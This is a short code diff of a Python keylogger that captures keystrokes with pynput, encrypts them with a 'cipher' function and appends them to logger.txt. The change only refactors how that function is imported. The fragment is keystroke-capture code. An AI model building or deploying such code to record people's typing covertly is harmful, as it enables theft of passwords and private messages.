@@ -1,6 +1,6 @@
 from pynput.keyboard import Key, Controller, Listener
 import os
-import LimboAlg
+from LimboAlg import cipher
 Keyboard = Controller()
 def main():
     def on_press(key):
@@ -17,7 +17,7 @@ def main():
             for key,value in keycode_to_replace.items():
                 keydata = keydata.replace(key,value)
             with open('logger.txt', 'a') as logs:
-                new_keydata = LimboAlg.cipher(keydata)
+                new_keydata = cipher(keydata)
                 logs.write(new_keydata)
         else:
             listener.stop()
